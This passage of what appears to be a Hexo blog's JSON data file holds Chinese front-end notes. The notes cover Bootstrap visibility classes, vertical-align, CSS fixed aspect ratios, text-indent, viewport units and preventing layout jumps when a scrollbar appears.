Bootstrap不同分辨率下隐藏元素\n\nhidden-xs hidden-sm 等控制隐藏\nvisible-xs-* visible-sm-* 等控制显示\n\n[说明文档](http://v3.bootcss.com/css/#responsive-utilities)\n\n-----------\n","source":"_posts/FrontEnd/HTML+CSS/Bootstrap响应式布局.md","raw":"---\ntitle: Bootstrap响应式布局\ndate: 2018-05-11 16:24:17\ntags: Bootstrap\ncategories: CSS\n---\n## Bootstrap不同分辨率下隐藏元素\n\nhidden-xs hidden-sm 等控制隐藏\nvisible-xs-* visible-sm-* 等控制显示\n\n[说明文档](http://v3.bootcss.com/css/#responsive-utilities)\n\n-----------\n","slug":"FrontEnd/HTML+CSS/Bootstrap响应式布局","published":1,"updated":"2018-05-11T08:27:30.274Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2bh005fb8xjg9v4awru","content":"<h2 id=\"Bootstrap不同分辨率下隐藏元素\"><a href=\"#Bootstrap不同分辨率下隐藏元素\" class=\"headerlink\" title=\"Bootstrap不同分辨率下隐藏元素\"></a>Bootstrap不同分辨率下隐藏元素</h2><p>hidden-xs hidden-sm 等控制隐藏<br>visible-xs-<em> visible-sm-</em> 等控制显示</p>\n<p><a href=\"http://v3.bootcss.com/css/#responsive-utilities\" target=\"_blank\" rel=\"noopener\">说明文档</a></p>\n<hr>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Bootstrap不同分辨率下隐藏元素\"><a href=\"#Bootstrap不同分辨率下隐藏元素\" class=\"headerlink\" title=\"Bootstrap不同分辨率下隐藏元素\"></a>Bootstrap不同分辨率下隐藏元素</h2><p>hidden-xs hidden-sm 等控制隐藏<br>visible-xs-<em> visible-sm-</em> 等控制显示</p>\n<p><a href=\"http://v3.bootcss.com/css/#responsive-utilities\" target=\"_blank\" rel=\"noopener\">说明文档</a></p>\n<hr>\n"},{"title":"Vertical-align","date":"2018-05-28T08:12:42.000Z","_content":"### 基线概念\n+ Top (行盒子顶部)\n+ Bottom (行盒子底部)\n\n+ Text-top (字体顶部)\n+ Text-bottom (字体底部)\n\n+ Middle\n+ baseline\n\n\n![Vertical-align](https://upload-images.jianshu.io/upload_images/3229842-bd636d582f21a29b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700)\n\n---\n[参考文章](https://www.jianshu.com/p/dea069fecb62)\n\n[Vertical-aligh 完全解读](https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&mid=2651554219&idx=1&sn=4647c8957b8063c2fd0433d351854610&chksm=8025566ab752df7c3295dddd442347d143e214945a86492aed790cd649a38ef5e10076d1c0aa&scene=0#rd)\n\n[完全解读2](http://www.zhangxinxu.com/wordpress/2015/08/css-deep-understand-vertical-align-and-line-height/)","source":"_posts/FrontEnd/HTML+CSS/Vertical-align.md","raw":"---\ntitle: Vertical-align\ndate: 2018-05-28 16:12:42\ntags: 垂直居中\ncategories: CSS\n---\n### 基线概念\n+ Top (行盒子顶部)\n+ Bottom (行盒子底部)\n\n+ Text-top (字体顶部)\n+ Text-bottom (字体底部)\n\n+ Middle\n+ baseline\n\n\n![Vertical-align](https://upload-images.jianshu.io/upload_images/3229842-bd636d582f21a29b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700)\n\n---\n[参考文章](https://www.jianshu.com/p/dea069fecb62)\n\n[Vertical-aligh 完全解读](https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&mid=2651554219&idx=1&sn=4647c8957b8063c2fd0433d351854610&chksm=8025566ab752df7c3295dddd442347d143e214945a86492aed790cd649a38ef5e10076d1c0aa&scene=0#rd)\n\n[完全解读2](http://www.zhangxinxu.com/wordpress/2015/08/css-deep-understand-vertical-align-and-line-height/)","slug":"FrontEnd/HTML+CSS/Vertical-align","published":1,"updated":"2018-05-28T09:03:47.351Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2bq005hb8xjsptwe7a1","content":"<h3 id=\"基线概念\"><a href=\"#基线概念\" class=\"headerlink\" title=\"基线概念\"></a>基线概念</h3><ul>\n<li>Top (行盒子顶部)</li>\n<li><p>Bottom (行盒子底部)</p>\n</li>\n<li><p>Text-top (字体顶部)</p>\n</li>\n<li><p>Text-bottom (字体底部)</p>\n</li>\n<li><p>Middle</p>\n</li>\n<li>baseline</li>\n</ul>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/3229842-bd636d582f21a29b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700\" alt=\"Vertical-align\"></p>\n<hr>\n<p><a href=\"https://www.jianshu.com/p/dea069fecb62\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&amp;mid=2651554219&amp;idx=1&amp;sn=4647c8957b8063c2fd0433d351854610&amp;chksm=8025566ab752df7c3295dddd442347d143e214945a86492aed790cd649a38ef5e10076d1c0aa&amp;scene=0#rd\" target=\"_blank\" rel=\"noopener\">Vertical-aligh 完全解读</a></p>\n<p><a href=\"http://www.zhangxinxu.com/wordpress/2015/08/css-deep-understand-vertical-align-and-line-height/\" target=\"_blank\" rel=\"noopener\">完全解读2</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"基线概念\"><a href=\"#基线概念\" class=\"headerlink\" title=\"基线概念\"></a>基线概念</h3><ul>\n<li>Top (行盒子顶部)</li>\n<li><p>Bottom (行盒子底部)</p>\n</li>\n<li><p>Text-top (字体顶部)</p>\n</li>\n<li><p>Text-bottom (字体底部)</p>\n</li>\n<li><p>Middle</p>\n</li>\n<li>baseline</li>\n</ul>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/3229842-bd636d582f21a29b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700\" alt=\"Vertical-align\"></p>\n<hr>\n<p><a href=\"https://www.jianshu.com/p/dea069fecb62\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&amp;mid=2651554219&amp;idx=1&amp;sn=4647c8957b8063c2fd0433d351854610&amp;chksm=8025566ab752df7c3295dddd442347d143e214945a86492aed790cd649a38ef5e10076d1c0aa&amp;scene=0#rd\" target=\"_blank\" rel=\"noopener\">Vertical-aligh 完全解读</a></p>\n<p><a href=\"http://www.zhangxinxu.com/wordpress/2015/08/css-deep-understand-vertical-align-and-line-height/\" target=\"_blank\" rel=\"noopener\">完全解读2</a></p>\n"},{"title":"CSS固定宽高比","date":"2018-06-14T08:40:12.000Z","_content":"## 纯CSS实现固定宽高比\n````\n  <style type=\"text/css\">\n    .container {\n      position: relative;\n      width: 40%;\n      /*触发BFC，否则内部元素撑不开container*/\n      overflow: hidden;\n      /*为了让大家看清楚效果加的边*/\n      border: 1px solid black;\n    }\n\n    /*支架，用于按2:1的宽高比撑开父级元素，如果是4:3，那么这里改成75%即可*/\n    .container::before {\n      display: block;\n      content: '';\n      margin-top: 50%;\n    }\n\n    .target {\n      position: absolute;\n      top: 0;\n      bottom: 0;\n      left: 0;\n      right: 0;\n      width: 100%;\n      height: 100%;\n    }\n  </style>\n\n<body>\n  <div class=\"container\">\n    <img class=\"target\" src=\"http://i2.tiimg.com/611341/b66c935ed2587806t.jpg\" alt=\"\">\n  </div>\n</body>\n````\n总结：\n\n容器元素：宽度百分比，`overflow：hidden;` 防止与父元素margin重叠，进入BFC块级格式化上下文。相对定位，为`target`容器确定定位参照。\n\n伪类元素：`margin-top`百分比值继承自父元素宽度,通过伪类元素撑开容器盒子,使其拥有高度.\n\n目标元素：通过绝对定位，脱离文档流，并使 宽/高100% 继承父元素宽高值。来达到img固定宽高比。\n\n\n\n---\n[附：原文地址](https://www.cnblogs.com/coolle/p/6553092.html)\n\n[参考文献](https://www.cnblogs.com/xjnotxj/p/5517651.html)\n\n---\n## 背景色\n16进制cdc转rgb(204,221,204)\n\n","source":"_posts/FrontEnd/HTML+CSS/CSS固定宽高比.md","raw":"---\ntitle: CSS固定宽高比\ndate: 2018-06-14 16:40:12\ntags: 固定宽高比\ncategories: HTML+CSS\n---\n## 纯CSS实现固定宽高比\n````\n  <style type=\"text/css\">\n    .container {\n      position: relative;\n      width: 40%;\n      /*触发BFC，否则内部元素撑不开container*/\n      overflow: hidden;\n      /*为了让大家看清楚效果加的边*/\n      border: 1px solid black;\n    }\n\n    /*支架，用于按2:1的宽高比撑开父级元素，如果是4:3，那么这里改成75%即可*/\n    .container::before {\n      display: block;\n      content: '';\n      margin-top: 50%;\n    }\n\n    .target {\n      position: absolute;\n      top: 0;\n      bottom: 0;\n      left: 0;\n      right: 0;\n      width: 100%;\n      height: 100%;\n    }\n  </style>\n\n<body>\n  <div class=\"container\">\n    <img class=\"target\" src=\"http://i2.tiimg.com/611341/b66c935ed2587806t.jpg\" alt=\"\">\n  </div>\n</body>\n````\n总结：\n\n容器元素：宽度百分比，`overflow：hidden;` 防止与父元素margin重叠，进入BFC块级格式化上下文。相对定位，为`target`容器确定定位参照。\n\n伪类元素：`margin-top`百分比值继承自父元素宽度,通过伪类元素撑开容器盒子,使其拥有高度.\n\n目标元素：通过绝对定位，脱离文档流，并使 宽/高100% 继承父元素宽高值。来达到img固定宽高比。\n\n\n\n---\n[附：原文地址](https://www.cnblogs.com/coolle/p/6553092.html)\n\n[参考文献](https://www.cnblogs.com/xjnotxj/p/5517651.html)\n\n---\n## 背景色\n16进制cdc转rgb(204,221,204)\n\n","slug":"FrontEnd/HTML+CSS/CSS固定宽高比","published":1,"updated":"2018-06-19T06:02:39.687Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2br005ib8xjs129m5hs","content":"<h2 id=\"纯CSS实现固定宽高比\"><a href=\"#纯CSS实现固定宽高比\" class=\"headerlink\" title=\"纯CSS实现固定宽高比\"></a>纯CSS实现固定宽高比</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  &lt;style type=&quot;text/css&quot;&gt;</span><br><span class=\"line\">    .container &#123;</span><br><span class=\"line\">      position: relative;</span><br><span class=\"line\">      width: 40%;</span><br><span class=\"line\">      /*触发BFC，否则内部元素撑不开container*/</span><br><span class=\"line\">      overflow: hidden;</span><br><span class=\"line\">      /*为了让大家看清楚效果加的边*/</span><br><span class=\"line\">      border: 1px solid black;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /*支架，用于按2:1的宽高比撑开父级元素，如果是4:3，那么这里改成75%即可*/</span><br><span class=\"line\">    .container::before &#123;</span><br><span class=\"line\">      display: block;</span><br><span class=\"line\">      content: &apos;&apos;;</span><br><span class=\"line\">      margin-top: 50%;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    .target &#123;</span><br><span class=\"line\">      position: absolute;</span><br><span class=\"line\">      top: 0;</span><br><span class=\"line\">      bottom: 0;</span><br><span class=\"line\">      left: 0;</span><br><span class=\"line\">      right: 0;</span><br><span class=\"line\">      width: 100%;</span><br><span class=\"line\">      height: 100%;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &lt;/style&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">  &lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">    &lt;img class=&quot;target&quot; src=&quot;http://i2.tiimg.com/611341/b66c935ed2587806t.jpg&quot; alt=&quot;&quot;&gt;</span><br><span class=\"line\">  &lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>总结：</p>\n<p>容器元素：宽度百分比，<code>overflow：hidden;</code> 防止与父元素margin重叠，进入BFC块级格式化上下文。相对定位，为<code>target</code>容器确定定位参照。</p>\n<p>伪类元素：<code>margin-top</code>百分比值继承自父元素宽度,通过伪类元素撑开容器盒子,使其拥有高度.</p>\n<p>目标元素：通过绝对定位，脱离文档流，并使 宽/高100% 继承父元素宽高值。来达到img固定宽高比。</p>\n<hr>\n<p><a href=\"https://www.cnblogs.com/coolle/p/6553092.html\" target=\"_blank\" rel=\"noopener\">附：原文地址</a></p>\n<p><a href=\"https://www.cnblogs.com/xjnotxj/p/5517651.html\" target=\"_blank\" rel=\"noopener\">参考文献</a></p>\n<hr>\n<h2 id=\"背景色\"><a href=\"#背景色\" class=\"headerlink\" title=\"背景色\"></a>背景色</h2><p>16进制cdc转rgb(204,221,204)</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"纯CSS实现固定宽高比\"><a href=\"#纯CSS实现固定宽高比\" class=\"headerlink\" title=\"纯CSS实现固定宽高比\"></a>纯CSS实现固定宽高比</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  &lt;style type=&quot;text/css&quot;&gt;</span><br><span class=\"line\">    .container &#123;</span><br><span class=\"line\">      position: relative;</span><br><span class=\"line\">      width: 40%;</span><br><span class=\"line\">      /*触发BFC，否则内部元素撑不开container*/</span><br><span class=\"line\">      overflow: hidden;</span><br><span class=\"line\">      /*为了让大家看清楚效果加的边*/</span><br><span class=\"line\">      border: 1px solid black;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /*支架，用于按2:1的宽高比撑开父级元素，如果是4:3，那么这里改成75%即可*/</span><br><span class=\"line\">    .container::before &#123;</span><br><span class=\"line\">      display: block;</span><br><span class=\"line\">      content: &apos;&apos;;</span><br><span class=\"line\">      margin-top: 50%;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    .target &#123;</span><br><span class=\"line\">      position: absolute;</span><br><span class=\"line\">      top: 0;</span><br><span class=\"line\">      bottom: 0;</span><br><span class=\"line\">      left: 0;</span><br><span class=\"line\">      right: 0;</span><br><span class=\"line\">      width: 100%;</span><br><span class=\"line\">      height: 100%;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &lt;/style&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">  &lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">    &lt;img class=&quot;target&quot; src=&quot;http://i2.tiimg.com/611341/b66c935ed2587806t.jpg&quot; alt=&quot;&quot;&gt;</span><br><span class=\"line\">  &lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>总结：</p>\n<p>容器元素：宽度百分比，<code>overflow：hidden;</code> 防止与父元素margin重叠，进入BFC块级格式化上下文。相对定位，为<code>target</code>容器确定定位参照。</p>\n<p>伪类元素：<code>margin-top</code>百分比值继承自父元素宽度,通过伪类元素撑开容器盒子,使其拥有高度.</p>\n<p>目标元素：通过绝对定位，脱离文档流，并使 宽/高100% 继承父元素宽高值。来达到img固定宽高比。</p>\n<hr>\n<p><a href=\"https://www.cnblogs.com/coolle/p/6553092.html\" target=\"_blank\" rel=\"noopener\">附：原文地址</a></p>\n<p><a href=\"https://www.cnblogs.com/xjnotxj/p/5517651.html\" target=\"_blank\" rel=\"noopener\">参考文献</a></p>\n<hr>\n<h2 id=\"背景色\"><a href=\"#背景色\" class=\"headerlink\" title=\"背景色\"></a>背景色</h2><p>16进制cdc转rgb(204,221,204)</p>\n"},{"title":"text-indent","date":"2018-05-30T06:28:47.000Z","_content":"## CSS text-indent段落首行文字缩进\n1. css text-indent文本缩进样式属性单词，`text-indent`的值跟 `数字` + `单位` 组成缩进样式。\n\n````\n    .divcss5{ text-indent:35px}\n````\n\n2. 通常 `text-indent` 缩进属性将对`段落首行开头`文本文字进行缩进显示。如果使用`html br换行标签`，第二个换行开始也不会出现缩进效果。如果使用了html `P段落标签`段落换行，将会出现每个p段落换行开头都将缩进，这里我们给大家通过案例演示给大家，希望通过DIVCSS5案例掌握CSS text-indent缩进样式。\n\n\n<img src=\"\" word_img=\"\" style=\"background-image: url(about:blank); background-attachment: initial; background-size: initial; background-origin: initial; background-clip: initial; background-position: 50% 50%; background-repeat: no-repeat;\" />","source":"_posts/FrontEnd/HTML+CSS/text-indent.md","raw":"---\ntitle: text-indent\ndate: 2018-05-30 14:28:47\ntags: 首行缩进\ncategories: CSS\n---\n## CSS text-indent段落首行文字缩进\n1. css text-indent文本缩进样式属性单词，`text-indent`的值跟 `数字` + `单位` 组成缩进样式。\n\n````\n    .divcss5{ text-indent:35px}\n````\n\n2. 通常 `text-indent` 缩进属性将对`段落首行开头`文本文字进行缩进显示。如果使用`html br换行标签`，第二个换行开始也不会出现缩进效果。如果使用了html `P段落标签`段落换行，将会出现每个p段落换行开头都将缩进，这里我们给大家通过案例演示给大家，希望通过DIVCSS5案例掌握CSS text-indent缩进样式。\n\n\n<img src=\"\" word_img=\"\" style=\"background-image: url(about:blank); background-attachment: initial; background-size: initial; background-origin: initial; background-clip: initial; background-position: 50% 50%; background-repeat: no-repeat;\" />","slug":"FrontEnd/HTML+CSS/text-indent","published":1,"updated":"2018-05-30T06:48:34.581Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2bt005kb8xjhqb5qmqt","content":"<h2 id=\"CSS-text-indent段落首行文字缩进\"><a href=\"#CSS-text-indent段落首行文字缩进\" class=\"headerlink\" title=\"CSS text-indent段落首行文字缩进\"></a>CSS text-indent段落首行文字缩进</h2><ol>\n<li>css text-indent文本缩进样式属性单词，<code>text-indent</code>的值跟 <code>数字</code> + <code>单位</code> 组成缩进样式。</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.divcss5&#123; text-indent:35px&#125;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>通常 <code>text-indent</code> 缩进属性将对<code>段落首行开头</code>文本文字进行缩进显示。如果使用<code>html br换行标签</code>，第二个换行开始也不会出现缩进效果。如果使用了html <code>P段落标签</code>段落换行，将会出现每个p段落换行开头都将缩进，这里我们给大家通过案例演示给大家，希望通过DIVCSS5案例掌握CSS text-indent缩进样式。</li>\n</ol>\n<p><img src=\"\" word_img=\"\" style=\"background-image: url(about:blank); background-attachment: initial; background-size: initial; background-origin: initial; background-clip: initial; background-position: 50% 50%; background-repeat: no-repeat;\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"CSS-text-indent段落首行文字缩进\"><a href=\"#CSS-text-indent段落首行文字缩进\" class=\"headerlink\" title=\"CSS text-indent段落首行文字缩进\"></a>CSS text-indent段落首行文字缩进</h2><ol>\n<li>css text-indent文本缩进样式属性单词，<code>text-indent</code>的值跟 <code>数字</code> + <code>单位</code> 组成缩进样式。</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.divcss5&#123; text-indent:35px&#125;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>通常 <code>text-indent</code> 缩进属性将对<code>段落首行开头</code>文本文字进行缩进显示。如果使用<code>html br换行标签</code>，第二个换行开始也不会出现缩进效果。如果使用了html <code>P段落标签</code>段落换行，将会出现每个p段落换行开头都将缩进，这里我们给大家通过案例演示给大家，希望通过DIVCSS5案例掌握CSS text-indent缩进样式。</li>\n</ol>\n<p><img src=\"\" word_img=\"\" style=\"background-image: url(about:blank); background-attachment: initial; background-size: initial; background-origin: initial; background-clip: initial; background-position: 50% 50%; background-repeat: no-repeat;\"></p>\n"},{"title":"vw/vh/vm","date":"2018-06-22T01:07:31.000Z","_content":"## 视区相关单位`vw / vh / vm`简介以及可实际应用场景\n\n---\n[阅读原文](https://www.zhangxinxu.com/wordpress/2012/09/new-viewport-relative-units-vw-vh-vm-vmin/)","source":"_posts/FrontEnd/HTML+CSS/vw-vh-vm.md","raw":"---\ntitle: vw/vh/vm\ndate: 2018-06-22 09:07:31\ntags: vw/vh/vm\ncategories: CSS\n---\n## 视区相关单位`vw / vh / vm`简介以及可实际应用场景\n\n---\n[阅读原文](https://www.zhangxinxu.com/wordpress/2012/09/new-viewport-relative-units-vw-vh-vm-vmin/)","slug":"FrontEnd/HTML+CSS/vw-vh-vm","published":1,"updated":"2018-06-22T01:19:06.331Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2bx005pb8xjka5uj9dy","content":"<h2 id=\"视区相关单位vw-vh-vm简介以及可实际应用场景\"><a href=\"#视区相关单位vw-vh-vm简介以及可实际应用场景\" class=\"headerlink\" title=\"视区相关单位vw / vh / vm简介以及可实际应用场景\"></a>视区相关单位<code>vw / vh / vm</code>简介以及可实际应用场景</h2><hr>\n<p><a href=\"https://www.zhangxinxu.com/wordpress/2012/09/new-viewport-relative-units-vw-vh-vm-vmin/\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"视区相关单位vw-vh-vm简介以及可实际应用场景\"><a href=\"#视区相关单位vw-vh-vm简介以及可实际应用场景\" class=\"headerlink\" title=\"视区相关单位vw / vh / vm简介以及可实际应用场景\"></a>视区相关单位<code>vw / vh / vm</code>简介以及可实际应用场景</h2><hr>\n<p><a href=\"https://www.zhangxinxu.com/wordpress/2012/09/new-viewport-relative-units-vw-vh-vm-vmin/\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"em布局","date":"2018-05-15T05:57:14.000Z","_content":"","source":"_posts/FrontEnd/HTML+CSS/em布局.md","raw":"---\ntitle: em布局\ndate: 2018-05-15 13:57:14\ntags: em布局\ncategories: CSS\n---\n","slug":"FrontEnd/HTML+CSS/em布局","published":1,"updated":"2018-05-15T06:02:43.496Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2c0005rb8xjyehw1crj","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"禁止滚动条出现页面跳动","date":"2018-06-22T08:48:01.000Z","_content":"## 水平居中布局与滚动条跳动的千年难题\n1.信息流页面，如新浪微博，是从上往下push渲染的。开始只有头部一些信息加载，此时页面高度有限，没有滚动条；然后，更多内容显示，滚动条出现，占据可用宽度，margin: 0 auto主体元素自然会做偏移——跳动产生。\n\n2.JS交互，本来默认页面高度不足一屏，结果点击了个“加载更多”，内容超过一屏，滚动条出现，页面主体就会左侧跳动。\n\n3.结构类似几个页面通过头部的水平导航刷新切换，结果有的页面有滚动条，有的没有。造成的结果就是，导航尼玛怎么跳来跳去！\n\n## CSS3计算`calc`和`vw`单位巧妙实现滚动条出现页面不跳动\n````\n.wrap-outer {\n    margin-left: calc(100vw - 100%);\n    // 或者\n    padding-left: calc(100vw - 100%);\n}\n````\n**首先**：`.wrap-outer`指的是居中定宽主体的父级，如果没有，创建一个（使用主体也是可以实现类似效果，不过本着宽度分离原则，不推荐）;\n\n**然后**: `calc`是CSS3中的计算，IE10+浏览器支持，IE9浏览器基本支持(不能用在background-position上);\n\n**最后**: `100vw`相对于浏览器的`window.innerWidth`，是`浏览器内部宽度`，注意，`滚动条宽度也计算在内`！ 而`100%是可用宽度`，是`不含滚动条宽度`。\n\n**于是**: `calc(100vw - 100%)`就是`浏览器滚动条宽度`(如果没有滚动条则是0)！左右都有一个滚动条宽度（或都是0）被占用，主体内容就可以永远居中浏览器啦，从而没有任何跳动！\n\n### **兼容性**\n支持：`IE9+` 以及其他现代浏览器。\n\n### **窄屏幕宽度下的处理**\n上面CSS还是有一点瑕疵的，浏览器宽度比较小的时候，左侧留的白明显与右边多，说不定会显得有点傻。此时，可能需要做点响应式处理会更好一点：\n\n````\n@media screen and (min-width: 1150px) {\n   .wrap-outer {\n       margin-left: calc(100vw - 100%);\n   }\n}\n````\n\n## 更新于2016年9月28日\n经过一些列项目实践，关于浏览器出现滚动条和消失页面不滚动有了`更加终极的解决方案`，经过大型项目实践已经验证相当具有可行性，这里特意分享下：\n````\nhtml {\n  overflow-y: scroll;\n}\n\n:root {\n  overflow-y: auto;\n  overflow-x: hidden;\n}\n\n:root body {\n  position: absolute;\n}\n\nbody {\n  width: 100vw;\n  overflow: hidden;\n}\n````\n\n## 三、结束语\n本文参考自：[Fix ‘jumping scrollbar’ issue using only CSS](https://aykevl.nl/2014/09/fix-jumping-scrollbar)\n\n[阅读原文](https://www.zhangxinxu.com/wordpress/2015/01/css-page-scrollbar-toggle-center-no-jumping/)","source":"_posts/FrontEnd/HTML+CSS/禁止滚动条出现页面跳动.md","raw":"---\ntitle: 禁止滚动条出现页面跳动\ndate: 2018-06-22 16:48:01\ntags: vw让overflow:auto\ncategories: HTML CSS\n---\n## 水平居中布局与滚动条跳动的千年难题\n1.信息流页面，如新浪微博，是从上往下push渲染的。开始只有头部一些信息加载，此时页面高度有限，没有滚动条；然后，更多内容显示，滚动条出现，占据可用宽度，margin: 0 auto主体元素自然会做偏移——跳动产生。\n\n2.JS交互，本来默认页面高度不足一屏，结果点击了个“加载更多”，内容超过一屏，滚动条出现，页面主体就会左侧跳动。\n\n3.结构类似几个页面通过头部的水平导航刷新切换，结果有的页面有滚动条，有的没有。造成的结果就是，导航尼玛怎么跳来跳去！\n\n## CSS3计算`calc`和`vw`单位巧妙实现滚动条出现页面不跳动\n````\n.wrap-outer {\n    margin-left: calc(100vw - 100%);\n    // 或者\n    padding-left: calc(100vw - 100%);\n}\n````\n**首先**：`.wrap-outer`指的是居中定宽主体的父级，如果没有，创建一个（使用主体也是可以实现类似效果，不过本着宽度分离原则，不推荐）;\n\n**然后**: `calc`是CSS3中的计算，IE10+浏览器支持，IE9浏览器基本支持(不能用在background-position上);\n\n**最后**: `100vw`相对于浏览器的`window.innerWidth`，是`浏览器内部宽度`，注意，`滚动条宽度也计算在内`！ 而`100%是可用宽度`，是`不含滚动条宽度`。\n\n**于是**: `calc(100vw - 100%)`就是`浏览器滚动条宽度`(如果没有滚动条则是0)！左右都有一个滚动条宽度（或都是0）被占用，主体内容就可以永远居中浏览器啦，从而没有任何跳动！\n\n### **兼容性**\n支持：`IE9+` 以及其他现代浏览器。\n\n### **窄屏幕宽度下的处理**\n上面CSS还是有一点瑕疵的，浏览器宽度比较小的时候，左侧留的白明显与右边多，说不定会显得有点傻。此时，可能需要做点响应式处理会更好一点：\n\n````\n@media screen and (min-width: 1150px) {\n   .wrap-outer {\n       margin-left: calc(100vw - 100%);\n   }\n}\n````\n\n## 更新于2016年9月28日\n经过一些列项目实践，关于浏览器出现滚动条和消失页面不滚动有了`更加终极的解决方案`，经过大型项目实践已经验证相当具有可行性，这里特意分享下：\n````\nhtml {\n  overflow-y: scroll;\n}\n\n:root {\n  overflow-y: auto;\n  overflow-x: hidden;\n}\n\n:root body {\n  position: absolute;\n}\n\nbody {\n  width: 100vw;\n  overflow: hidden;\n}\n````\n\n## 三、结束语\n本文参考自：[Fix ‘jumping scrollbar’ issue using only CSS](https://aykevl.nl/2014/09/fix-jumping-scrollbar)\n\n[阅读原文](https://www.zhangxinxu.com/wordpress/2015/01/css-page-scrollbar-toggle-center-no-jumping/)","slug":"FrontEnd/HTML+CSS/禁止滚动条出现页面跳动","published":1,"updated":"2018-07-05T00:07:39.129Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2c2005tb8xjamadigmq","content":"<h2 id=\"水平居中布局与滚动条跳动的千年难题\"><a href=\"#水平居中布局与滚动条跳动的千年难题\" class=\"headerlink\" title=\"水平居中布局与滚动条跳动的千年难题\"></a>水平居中布局与滚动条跳动的千年难题</h2><p>1.信息流页面，如新浪微博，是从上往下push渲染的。开始只有头部一些信息加载，此时页面高度有限，没有滚动条；然后，更多内容显示，滚动条出现，占据可用宽度，margin: 0 auto主体元素自然会做偏移——跳动产生。</p>\n<p>2.JS交互，本来默认页面高度不足一屏，结果点击了个“加载更多”，内容超过一屏，滚动条出现，页面主体就会左侧跳动。</p>\n<p>3.结构类似几个页面通过头部的水平导航刷新切换，结果有的页面有滚动条，有的没有。造成的结果就是，导航尼玛怎么跳来跳去！</p>\n<h2 